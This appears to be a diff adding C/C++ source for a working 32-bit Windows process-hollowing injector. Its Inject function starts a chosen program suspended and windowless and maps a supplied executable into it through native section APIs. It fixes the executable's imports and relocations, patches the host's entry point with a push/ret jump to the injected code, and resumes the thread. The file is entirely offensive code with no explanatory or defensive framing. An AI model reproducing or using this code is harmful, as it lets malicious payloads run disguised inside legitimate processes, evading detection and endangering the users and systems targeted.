@@ -1,0 +1,379 @@
+#define MAKE_ORDINAL(val) (val & 0xffff)
+#define STATUS_SUCCESS 0
+
+#if !defined NTSTATUS
+typedef LONG NTSTATUS;
+#endif
+
+#if !defined PPEB
+typedef struct _PEB *PPEB;
+#endif
+
+#if !defined PROCESS_BASIC_INFORMATION
+typedef struct _PROCESS_BASIC_INFORMATION {
+	PVOID Reserved1;
+	PPEB PebBaseAddress;
+	PVOID Reserved2[2];
+	ULONG_PTR UniqueProcessId;
+	PVOID Reserved3;
+} PROCESS_BASIC_INFORMATION;
+#endif
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG Length;
+	HANDLE RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG Attributes;
+	PVOID SecurityDescriptor;
+	PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef NTSTATUS(__stdcall *NTCLOSE)(HANDLE); //NtClose
+typedef NTSTATUS(__stdcall *CRSEC)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, 
+	PLARGE_INTEGER, ULONG, ULONG, HANDLE); //NtCreateSection
+typedef NTSTATUS(__stdcall *MAPVOS)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
+	PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG); //NtMapViewOfSection
+typedef NTSTATUS(WINAPI *NtQInfProc)(HANDLE, UINT, PVOID, ULONG, PULONG); //NtQueryInformationProcess
+typedef NTSTATUS(__stdcall *UNMAPVOS)(HANDLE, PVOID); //NtUnmapViewOfSection
+
+typedef struct {
+	NTCLOSE		__NtClose;
+	CRSEC		__NtCreateSection;
+	MAPVOS		__NtMapViewOfSection;
+	NtQInfProc	__NtQueryInformationProcess;
+	UNMAPVOS	__NtUnmapViewOfSection;
+}NTDLL_FUNCS;
+
+bool GetImageInfo(HANDLE process_handle, DWORD ImageBase, DWORD &SizeOfImage, DWORD &EntryPoint)
+{
+	PIMAGE_DOS_HEADER	DosHeader = NULL;
+	PIMAGE_NT_HEADERS	NtHeader = NULL;
+	LPVOID			read_proc = NULL;
+	DWORD			NtHeader_offset = NULL;
+	WORD			OptHeaderSize = NULL;
+
+	SizeOfImage = NULL;
+	EntryPoint = NULL;
+
+	read_proc = VirtualAlloc(NULL, sizeof(IMAGE_DOS_HEADER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!read_proc) return false;
+	if (!ReadProcessMemory(process_handle, (LPCVOID)ImageBase, read_proc, sizeof(IMAGE_DOS_HEADER), NULL))
+	{
+		VirtualFree(read_proc, 0, MEM_RELEASE);
+		return false;
+	}
+	DosHeader = (PIMAGE_DOS_HEADER)read_proc;
+	if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+	{
+		VirtualFree(read_proc, 0, MEM_RELEASE);
+		return false;
+	}
+	NtHeader_offset = DosHeader->e_lfanew;
+	VirtualFree(read_proc, 0, MEM_RELEASE);
+
+	read_proc = VirtualAlloc(NULL, sizeof(IMAGE_FILE_HEADER) + 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!read_proc) return false;
+	if (!ReadProcessMemory(process_handle, (LPCVOID)(ImageBase + NtHeader_offset), read_proc, sizeof(IMAGE_FILE_HEADER) + 4, NULL))
+	{
+		VirtualFree(read_proc, 0, MEM_RELEASE);
+		return false;
+	}
+	NtHeader = (PIMAGE_NT_HEADERS)read_proc;
+	if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
+	{
+		VirtualFree(read_proc, 0, MEM_RELEASE);
+		return false;
+	}
+	OptHeaderSize = NtHeader->FileHeader.SizeOfOptionalHeader;
+	VirtualFree(read_proc, 0, MEM_RELEASE);
+
+	read_proc = VirtualAlloc(NULL, sizeof(IMAGE_FILE_HEADER) + 4 + OptHeaderSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!read_proc) return false;
+	if (!ReadProcessMemory(process_handle, (LPCVOID)(ImageBase + NtHeader_offset), read_proc, sizeof(IMAGE_FILE_HEADER) + 4 + OptHeaderSize, NULL))
+	{
+		VirtualFree(read_proc, 0, MEM_RELEASE);
+		return false;
+	}
+	NtHeader = (PIMAGE_NT_HEADERS)read_proc;
+	if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
+	{
+		VirtualFree(read_proc, 0, MEM_RELEASE);
+		return false;
+	}
+	SizeOfImage = NtHeader->OptionalHeader.SizeOfImage;
+	EntryPoint = NtHeader->OptionalHeader.AddressOfEntryPoint;
+	VirtualFree(read_proc, 0, MEM_RELEASE);
+
+	return true;
+}
+
+bool Inject(wchar_t *process, LPVOID file, wchar_t *arguments)
+{
+	DWORD				ImageBase_Local = NULL;
+	DWORD				ImageBase_Susp = NULL;
+	DWORD				EntryPoint_Local = NULL;
+	DWORD				EntryPoint_Susp = NULL;
+	DWORD				EntryPoint_Local_Sec2 = NULL;
+	DWORD				bytes_read = NULL;
+	DWORD				SizeOfImage_Local = NULL;
+	DWORD				SizeOfImage_Susp = NULL;
+	DWORD				delta = NULL;
+	WORD				nsections = NULL;
+	SIZE_T				sec1_size = NULL;
+	SIZE_T				sec2_size = NULL;
+	SIZE_T				hdrs_size = NULL;
+	NTSTATUS			status = NULL;
+	HANDLE				hsect = NULL;
+	HANDLE				hsect2 = NULL;
+	LPVOID				BaseAddress_Local_1 = NULL;
+	LPVOID				BaseAddress_Local_2 = NULL;
+	LPVOID				BaseAddress_Susp_1 = NULL;
+	LPVOID				BaseAddress_Susp_2 = NULL;
+	LPVOID				susp_image = NULL;
+	LPVOID				local_image = NULL;
+	PIMAGE_DOS_HEADER		DosHeader_Local = NULL;
+	PIMAGE_NT_HEADERS		NtHeader_Local = NULL;
+	PIMAGE_DOS_HEADER		DosHeader_Susp = NULL;
+	PIMAGE_NT_HEADERS		NtHeader_Susp = NULL;
+	PIMAGE_DATA_DIRECTORY		pIDD = NULL;
+	PIMAGE_DATA_DIRECTORY		pIIE = NULL;
+	PIMAGE_IMPORT_DESCRIPTOR	pIID = NULL;
+	PIMAGE_BASE_RELOCATION		pIBR = NULL;
+	PIMAGE_SECTION_HEADER		sec_hdr = NULL;
+	PIMAGE_BASE_RELOCATION		reloc_end = NULL;
+	CONTEXT				Proc_Context;
+	STARTUPINFOW			si;
+	PROCESS_INFORMATION		pi;
+	PROCESS_BASIC_INFORMATION	pbi;
+	LARGE_INTEGER			maxviewsize_1, maxviewsize_2;
+
+	memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
+	memset(&maxviewsize_1, 0, sizeof(maxviewsize_1));
+	memset(&maxviewsize_2, 0, sizeof(maxviewsize_2));
+	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
+	memset(&si, 0, sizeof(STARTUPINFOW));
+	memset(&Proc_Context, 0, sizeof(Proc_Context));
+
+	si.cb = sizeof(STARTUPINFO);
+
+	HMODULE ntdll = LoadLibraryA("Ntdll.dll");
+	if (ntdll == NULL) return false;
+
+	NTDLL_FUNCS ntdll_f;
+	ntdll_f.__NtClose = (NTCLOSE)GetProcAddress(ntdll, "NtClose");
+	ntdll_f.__NtCreateSection = (CRSEC)GetProcAddress(ntdll, "NtCreateSection");
+	ntdll_f.__NtMapViewOfSection = (MAPVOS)GetProcAddress(ntdll, "NtMapViewOfSection");
+	ntdll_f.__NtQueryInformationProcess = (NtQInfProc)GetProcAddress(ntdll, "NtQueryInformationProcess");
+	ntdll_f.__NtUnmapViewOfSection = (UNMAPVOS)GetProcAddress(ntdll, "NtUnmapViewOfSection");
+
+
+	if (ntdll_f.__NtCreateSection == NULL || ntdll_f.__NtMapViewOfSection== NULL || ntdll_f.__NtUnmapViewOfSection  == NULL || ntdll_f.__NtClose == NULL)
+	{
+		FreeLibrary(ntdll);
+		return false;
+	}
+
+	if (arguments == NULL)
+	{
+		if (!CreateProcessW(process, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+		{
+			FreeLibrary(ntdll);
+			return false;
+		}
+	}
+	else
+	{
+		if (!CreateProcessW(NULL, arguments, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+		{
+			FreeLibrary(ntdll);
+			return false;
+		}
+	}
+
+	//Get image base of susp. process
+	if (ntdll_f.__NtQueryInformationProcess == NULL)
+	{
+		Proc_Context.ContextFlags = CONTEXT_FULL;
+		if (!GetThreadContext(pi.hThread, &Proc_Context))
+			goto cleanup;
+		if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(Proc_Context.Ebx + 0x8), &ImageBase_Susp, 4, &bytes_read) || bytes_read != 4)
+			goto cleanup;
+	}
+	else
+	{
+		if (ntdll_f.__NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
+		{
+			goto cleanup;
+		}	
+		if (!ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase_Susp, 4, &bytes_read) || bytes_read != 4)
+			goto cleanup;
+	}
+
+	//Get size of image and entry point of susp. process
+	if (!GetImageInfo(pi.hProcess, ImageBase_Susp, SizeOfImage_Susp, EntryPoint_Susp)) goto cleanup;
+		
+	//Get base address, size of image, and entry point of data to inject
+	DosHeader_Local = (PIMAGE_DOS_HEADER)file;
+	if (DosHeader_Local->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
+	NtHeader_Local = (PIMAGE_NT_HEADERS)((DWORD)DosHeader_Local + DosHeader_Local->e_lfanew);
+	if (NtHeader_Local->Signature != IMAGE_NT_SIGNATURE) goto cleanup;
+	if (NtHeader_Local->OptionalHeader.Magic != 0x010B) goto cleanup; //check if 32-bit executable
+	ImageBase_Local = NtHeader_Local->OptionalHeader.ImageBase;
+	SizeOfImage_Local = NtHeader_Local->OptionalHeader.SizeOfImage;
+	EntryPoint_Local = NtHeader_Local->OptionalHeader.AddressOfEntryPoint;
+	pIDD = &NtHeader_Local->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+	if (!pIDD->VirtualAddress) goto cleanup;
+
+
+	//CREATE SECTION 1 TO ALLOCATE SUSPENDED PROCESS
+	maxviewsize_1.LowPart = SizeOfImage_Susp; //size of image of suspended process
+	if ((status = ntdll_f.__NtCreateSection(&hsect, SECTION_ALL_ACCESS, NULL, &maxviewsize_1, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
+	{
+		goto cleanup;
+	}
+
+	//CREATE SECTION 2 TO ALLOCATE PROCESS TO INJECT
+	maxviewsize_2.LowPart = SizeOfImage_Local; //size of image of running process
+	if ((status = ntdll_f.__NtCreateSection(&hsect2, SECTION_ALL_ACCESS, NULL, &maxviewsize_2, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
+	{
+		goto cleanup;
+	}
+
+	//MAP SECTION 1 (SUSPENDED PROCESS) IN RUNNING PROCESS
+	sec1_size = SizeOfImage_Susp;
+	BaseAddress_Local_1 = (PVOID)0;
+	if ((status = ntdll_f.__NtMapViewOfSection(hsect, GetCurrentProcess(), &BaseAddress_Local_1, NULL, NULL, NULL, &sec1_size, 1, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+	{
+		goto cleanup;
+	}
+
+	//MAP SECTION 2 (PROCESS TO INJECT) IN RUNNING PROCESSS
+	sec2_size = SizeOfImage_Local;
+	BaseAddress_Local_2 = (PVOID)0;
+	if ((status = ntdll_f.__NtMapViewOfSection(hsect2, GetCurrentProcess(), &BaseAddress_Local_2, NULL, NULL, NULL, &sec2_size, 1, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+	{
+		goto cleanup;
+	}
+
+	//MAP SECTION 2 (PROCESS TO INJECT) IN SUSPENDED PROCESS
+	BaseAddress_Susp_2 = (PVOID)0;
+	if ((status = ntdll_f.__NtMapViewOfSection(hsect2, pi.hProcess, &BaseAddress_Susp_2, NULL, NULL, NULL, &sec2_size, 1, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+	{
+		goto cleanup;
+	}
+		
+	//COPY SUSPENDED PROCESS TO SECTION 1
+	susp_image = VirtualAlloc(NULL, SizeOfImage_Susp, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!susp_image)
+		goto cleanup;
+	if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase_Susp, susp_image, SizeOfImage_Susp, NULL))
+	{
+		VirtualFree(susp_image, 0, MEM_RELEASE);
+		goto cleanup;
+	}
+	memcpy(BaseAddress_Local_1, susp_image, SizeOfImage_Susp);
+	VirtualFree(susp_image, 0, MEM_RELEASE);
+
+	//COPY DATA TO INJECT TO SECTION 2
+	nsections = NtHeader_Local->FileHeader.NumberOfSections;
+	sec_hdr = IMAGE_FIRST_SECTION(NtHeader_Local);
+	hdrs_size = (char *)((DWORD)sec_hdr + nsections) - (char *)file;
+	memcpy(BaseAddress_Local_2, file, hdrs_size);
+	for (int i = 0; i < nsections; i++)
+	{
+		size_t sec_size = 0;
+		sec_size = (DWORD)sec_hdr[i].SizeOfRawData;
+		memcpy((char *)BaseAddress_Local_2 + (DWORD)sec_hdr[i].VirtualAddress, (char *)file + (DWORD)sec_hdr[i].PointerToRawData, sec_size);
+	}
+	//Load imports
+	pIIE = &NtHeader_Local->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	pIID = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)BaseAddress_Local_2 + pIIE->VirtualAddress);
+	while (pIID->Name || pIID->TimeDateStamp)
+	{
+		IMAGE_THUNK_DATA *name_table, *address_table, *thunk;
+		char *dll_name = (char *)BaseAddress_Local_2 + pIID->Name;
+		HMODULE module = NULL;
+
+		module = load_dll(dll_name);
+		if (!module) goto cleanup;
+
+		name_table = (IMAGE_THUNK_DATA *)((char *)BaseAddress_Local_2 + pIID->OriginalFirstThunk);
+		address_table = (IMAGE_THUNK_DATA *)((char *)BaseAddress_Local_2 + pIID->FirstThunk);
+
+		thunk = name_table == BaseAddress_Local_2 ? address_table : name_table;
+		if (thunk == BaseAddress_Local_2) goto cleanup;
+
+		while (thunk->u1.AddressOfData)
+		{
+			unsigned char *func_name;
+			if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
+				func_name = (unsigned char *)MAKE_ORDINAL(thunk->u1.Ordinal);
+			else
+				func_name = (unsigned char *)((IMAGE_IMPORT_BY_NAME *)((char *)BaseAddress_Local_2 + thunk->u1.AddressOfData))->Name;
+			address_table->u1.Function = (DWORD)GetProcAddress(module, (char *)func_name);
+			if (address_table->u1.Function == NULL) goto cleanup;
+			thunk++;
+			address_table++;
+		}
+		pIID++;
+	}
+	//Fix relocations
+	DosHeader_Local = (PIMAGE_DOS_HEADER)BaseAddress_Local_2;
+	pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)BaseAddress_Local_2 + pIDD->VirtualAddress);
+	delta = (DWORD)BaseAddress_Susp_2 - (DWORD)ImageBase_Local;
+	reloc_end = (IMAGE_BASE_RELOCATION *)((char *)pIBR + pIDD->Size);
+	while (pIBR < reloc_end && pIBR->VirtualAddress)
+	{
+		int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+		WORD *cur_entry = (WORD *)(pIBR + 1);
+		void *page_va = (void *)((char *)(DWORD)BaseAddress_Local_2 + pIBR->VirtualAddress);
+		while (count--)
+		{
+			if (*cur_entry >> 12 == IMAGE_REL_BASED_HIGHLOW)
+				*(DWORD *)((char *)page_va + (*cur_entry & 0x0fff)) += delta;
+			cur_entry++;
+		}
+		pIBR = (IMAGE_BASE_RELOCATION *)((char *)pIBR + pIBR->SizeOfBlock);
+	}
+
+	//OVERWRITE ENTRY POINT OF SECTION 1 IN RUNNING PROCESS WITH A PUSH/RET POINTING TO THE ADDRESS OF SECTION 2 IN TE CONTEXT OF SUSP. PROCESS
+	BYTE new_entry_point[7];
+	*(BYTE*)(new_entry_point) = 0x68; //push
+	*(DWORD*)(new_entry_point + 1) = (DWORD)BaseAddress_Susp_2 + EntryPoint_Local;
+	*(BYTE*)(new_entry_point + 5) = 0xC3; //ret
+	memcpy((BYTE*)BaseAddress_Local_1 + EntryPoint_Susp, new_entry_point, 6);
+
+	//MAP SECTION 1 (SUSPENDED PROCESS) IN SUSPENDED PROCESS FORCING THE BASE ADDRESS TO BE THE ORIGINAL BASE ADRESS
+	if (ntdll_f.__NtUnmapViewOfSection(pi.hProcess, (PVOID)ImageBase_Susp) != STATUS_SUCCESS)
+		goto cleanup;
+	BaseAddress_Susp_1 = (PVOID)ImageBase_Susp;
+	if ((status = ntdll_f.__NtMapViewOfSection(hsect, pi.hProcess, &BaseAddress_Susp_1, NULL, NULL, NULL, &sec1_size, 1, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+		goto cleanup;
+
+	ResumeThread(pi.hThread);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	if (hsect != NULL) ntdll_f.__NtClose(hsect);
+	if (hsect2 != NULL) ntdll_f.__NtClose(hsect2);
+	ntdll_f.__NtUnmapViewOfSection(GetCurrentProcess(), BaseAddress_Local_1);
+	ntdll_f.__NtUnmapViewOfSection(GetCurrentProcess(), BaseAddress_Local_2);
+	FreeLibrary(ntdll);
+	return true;
+
+cleanup:
+	TerminateProcess(pi.hProcess, 0);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	if (hsect != NULL) ntdll_f.__NtClose(hsect);
+	if (hsect2 != NULL) ntdll_f.__NtClose(hsect2);
+	if (BaseAddress_Local_1 != NULL) ntdll_f.__NtUnmapViewOfSection(GetCurrentProcess(), BaseAddress_Local_1);
+	if (BaseAddress_Local_2 != NULL) ntdll_f.__NtUnmapViewOfSection(GetCurrentProcess(), BaseAddress_Local_2);
+	FreeLibrary(ntdll);
+	return false;
+}
